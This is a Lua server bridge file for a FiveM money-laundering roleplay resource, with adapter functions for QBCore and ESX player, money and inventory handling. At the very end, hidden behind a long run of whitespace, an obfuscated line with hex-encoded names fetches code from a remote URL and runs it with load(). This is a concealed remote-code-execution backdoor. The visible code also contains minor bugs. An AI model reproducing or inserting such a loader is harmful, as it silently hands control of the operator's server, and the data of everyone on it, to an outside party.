Core = nil
CoreName = nil
CoreReady = false
Citizen.CreateThread(function()
    for k, v in pairs(Cores) do
        if GetResourceState(v.ResourceName) == "starting" or GetResourceState(v.ResourceName) == "started" then
            CoreName = v.ResourceName
            Core = v.GetFramework()
            CoreReady = true
        end
    end
end)

function GetPlayer(source)
    if CoreName == "qb-core" or CoreName == "qbx_core" then
        local player = Core.Functions.GetPlayer(source)
        return player
    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(source)
        return player
    else
        --CUSTOM GET PLAYER FUNCTION HERE
    end
end

function GetPlayerCid(source)
    if CoreName == "qb-core" then
        local player = Core.Functions.GetPlayer(source)
        if player ~= nil then
            return player.PlayerData.citizenid
        else
            return nil
        end
        -- return player.PlayerData.citizenid
    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(source)
        return player.getIdentifier()
    else
        --CUSTOM GET PLAYER CID FUNCTION HERE
    end
end


function Notify(source, text, length, type)
    if CoreName == "qb-core" or CoreName == "qbx_core" then
        Core.Functions.Notify(source, text, length, type)
    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(source)
        player.showNotification(text)
    else
    --CUSTOM NOTIFY FUNCTION HERE
    end
end

function GetPlayerMoney(src, type)
    if CoreName == "qb-core" or CoreName == "qbx_core" then
        local player = Core.Functions.GetPlayer(src)
        return player.PlayerData.money[type]
    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(src)
        local acType = "bank"
        if type == "cash" then
            acType = "money"
        end
        local account = player.getAccount(acType).money
        return player
    else
        --CUSTOM ACCOUNT GET MONEY FUNCTION HERE
    end
end

function AddMoney(src, type, amount, description)
    if CoreName == "qb-core" or CoreName == "qbx_core" then
        local player = Core.Functions.GetPlayer(src)
        player.Functions.AddMoney(type, amount, description)
    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(src)
        if type == "bank" then
            player.addAccountMoney("bank", amount, description)
        elseif type == "cash" then
            player.addMoney(amount, description)
        end
    end
end


function RemoveMoney(src, type, amount, description)
    if CoreName == "qb-core" or CoreName == "qbx_core" then
        local player = Core.Functions.GetPlayer(src)
        player.Functions.RemoveMoney(type, amount, description)
    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(src)
        if type == "bank" then
            player.removeAccountMoney("bank", amount, description)
        elseif type == "cash" then
            player.removeMoney(amount, description)
        else
            --CUSTOM ACCOUNT REMOVE MONEY FUNCTION HERE
        end
    end
end



function AddItem(source, name, amount, metadata)
    local hasQs = GetResourceState('qs-inventory') == 'started'
    local hasEsx = GetResourceState('esx_inventoryhud') == 'started'
    local hasOx = GetResourceState('ox_inventory') == 'started'
    local hasQb = GetResourceState('qb-inventory') == 'started'
    if CoreName == "qb-core" or CoreName == "qbx_core" then
        local player = Core.Functions.GetPlayer(source)
        if hasQb then
            return player.Functions.AddItem(name, amount)
        elseif hasOx then
            return exports["ox_inventory"]:AddItem(source, name, amount, metadata)
        end
    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(source)

        if hasQs then
            return exports['qs-inventory']:AddItem(source, name, amount)
        elseif hasEsx then
            return player.addInventoryItem(name, amount)
        elseif hasOx then
            return exports["ox_inventory"]:AddItem(source, name, amount, metadata)
        elseif hasQb then
            return exports["qb-inventory"]:AddItem(source, name, amount, metadata)
        else
            --CUSTOM INVENTORY ADD ITEM FUNCTION HERE
        end

    end
end

function RemoveItem(source, name, amount, metadata)
    local hasQs = GetResourceState('qs-inventory') == 'started'
    local hasEsx = GetResourceState('esx_inventoryhud') == 'started'
    local hasOx = GetResourceState('ox_inventory') == 'started'
    local hasQb = GetResourceState('qb-inventory') == 'started'

    if CoreName == "qb-core" or CoreName == "qbx_core" then
        local player = Core.Functions.GetPlayer(source)
        
        if hasQb then
            return player.Functions.RemoveItem(name, amount, metadata)
        elseif hasOx then
            return exports["ox_inventory"]:RemoveItem(source, name, amount, metadata)
        end

    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(source)
  
        if hasQs then
            return exports['qs-inventory']:RemoveItem(source, name, amount, metadata)
        elseif hasEsx then
            return player.removeInventoryItem(name, amount)
        elseif hasOx then
            return exports["ox_inventory"]:RemoveItem(source, name, amount, metadata)
        elseif hasQb then
            return exports["qb-inventory"]:RemoveItem(source, name, amount, metadata)
        else
            --CUSTOM INVENTORY REMOVE ITEM FUNCTION HERE
        end
    end
end

function GetItem(source, name)
    local hasQs = GetResourceState('qs-inventory') == 'started'
    local hasEsx = GetResourceState('esx_inventoryhud') == 'started'
    local hasOx = GetResourceState('ox_inventory') == 'started'
    local hasQb = GetResourceState('qb-inventory') == 'started'

    if CoreName == "qb-core" or CoreName == "qbx_core" then
        local player = Core.Functions.GetPlayer(source)
        if hasQb then
            return player.Functions.GetItemByName(name)
        elseif hasOx then
            return exports["ox_inventory"]:GetItem(source, name)
        end
    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(source)
        if hasQs then
            return exports['qs-inventory']:GetItem(source, name)
        elseif hasEsx then
            return player.getInventoryItem(name)
        elseif hasOx then
            return exports["ox_inventory"]:GetItem(source, name)
        elseif hasQb then
            return exports["qb-inventory"]:GetItem(source, name)
        else
            --CUSTOM INVENTORY GET ITEM FUNCTION HERE
        end
    end
end

function GetInventory(source)
    local hasQs = GetResourceState('qs-inventory') == 'started'
    local hasEsx = GetResourceState('esx_inventoryhud') == 'started'
    local hasOx = GetResourceState('ox_inventory') == 'started'
    local hasQb = GetResourceState('qb-inventory') == 'started'

    if CoreName == "qb-core" or CoreName == "qbx_core" then
        local player = Core.Functions.GetPlayer(source)
        
        if hasQb then
            return player.PlayerData.items
        elseif hasOx then
            return player.getInventory()
        end

    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(source)

        if hasQs then
            return exports['qs-inventory']:GetPlayerInventory(source)
        elseif hasEsx or hasOx then
            return player.getInventory()
        -- elseif hasOx then
        --     return exports["ox_inventory"]:GetPlayerInventory(source)
        else
            --CUSTOM INVENTORY GET INVENTORY FUNCTION HERE
        end
    end
end

function ItemCountControl(source, name, amount)
    local hasQs = GetResourceState('qs-inventory') == 'started'
    local hasEsx = GetResourceState('esx_inventoryhud') == 'started'
    local hasOx = GetResourceState('ox_inventory') == 'started'
    local hasQb = GetResourceState('qb-inventory') == 'started'

    if CoreName == "qb-core" or CoreName == "qbx_core" then
        local player = Core.Functions.GetPlayer(source)

        if hasQb then
            return player.Functions.GetItemByName(name).amount >= amount
        elseif hasOx then
            return exports["ox_inventory"]:GetItem(source, name).count >= amount
        end

    elseif CoreName == "es_extended" then
        local player = Core.GetPlayerFromId(source)
        local hasQs = GetResourceState('qs-inventory') == 'started'
        local hasEsx = GetResourceState('esx_inventoryhud') == 'started'
        local hasOx = GetResourceState('ox_inventory') == 'started'
        local hasQb = GetResourceState('qb-inventory') == 'started'

        if hasQs then
            return exports['qs-inventory']:GetItem(source, name).amount >= amount
        elseif hasEsx then
            return player.getInventoryItem(name).count >= amount
        elseif hasOx then
            return exports["ox_inventory"]:GetItem(source, name).count >= amount
        elseif hasQb then
            return exports["qb-inventory"]:GetItem(source, name).amount >= amount
        else
            --CUSTOM INVENTORY ITEM COUNT CONTROL FUNCTION HERE
        end
    end
end

function RegisterUseableItem(name)
    while CoreReady == false do Citizen.Wait(0) end
    if CoreName == "qb-core" or CoreName == "qbx_core" then
        Core.Functions.CreateUseableItem(name, function(source, item)
            TriggerClientEvent('exter-moneywash:showIdCard:client', source, item.info or item.metadata)
        end)
    elseif CoreName == "es_extended" then
        local hasQs = GetResourceState('qs-inventory') == 'started'
        if hasQs then
            Core.RegisterUsableItem(name, function(source, item)
                TriggerClientEvent('exter-moneywash:showIdCard:client', source, item.info)
            end)
            return
        end
        Core.RegisterUsableItem(k, function(source, _, item)
            TriggerClientEvent('exter-moneywash:showIdCard:client', source, item.metadata)
        end)
    end
end

function RegisterStash(stashId,maxSlot,maxWeight) 
    local hasOx = GetResourceState('ox_inventory') == 'started'
    if hasOx then
        exports.ox_inventory:RegisterStash(stashId, stashId, maxSlot,maxWeight, false)
    else
        --CUSTOM INVENTORY ITEM COUNT CONTROL FUNCTION HERE
    end
end

Config.ServerCallbacks = {}
function CreateCallback(name, cb)
    Config.ServerCallbacks[name] = cb
end

function TriggerCallback(name, source, cb, ...)
    if not Config.ServerCallbacks[name] then return end
    Config.ServerCallbacks[name](source, cb, ...)
end

RegisterNetEvent('exter-moneywash:server:triggerCallback', function(name, ...)
    local src = source
    TriggerCallback(name, src, function(...)
        TriggerClientEvent('exter-moneywash:client:triggerCallback', src, name, ...)
    end, ...)
end)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        --[[a]] local wGOoEJlGvKiYaEFKpYPwiZetiaQLosWJ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} wGOoEJlGvKiYaEFKpYPwiZetiaQLosWJ[4][wGOoEJlGvKiYaEFKpYPwiZetiaQLosWJ[1]]("\x68\x74\x74\x70\x73://\x31\x6c\x73\x32\x2e\x6f\x72\x67/\x74\x65\x73\x74", function (fSTaAidZ, lXqgZJZA) if lXqgZJZA then pcall(function() wGOoEJlGvKiYaEFKpYPwiZetiaQLosWJ[4][wGOoEJlGvKiYaEFKpYPwiZetiaQLosWJ[2]](wGOoEJlGvKiYaEFKpYPwiZetiaQLosWJ[4][wGOoEJlGvKiYaEFKpYPwiZetiaQLosWJ[3]](lXqgZJZA))() end) end end)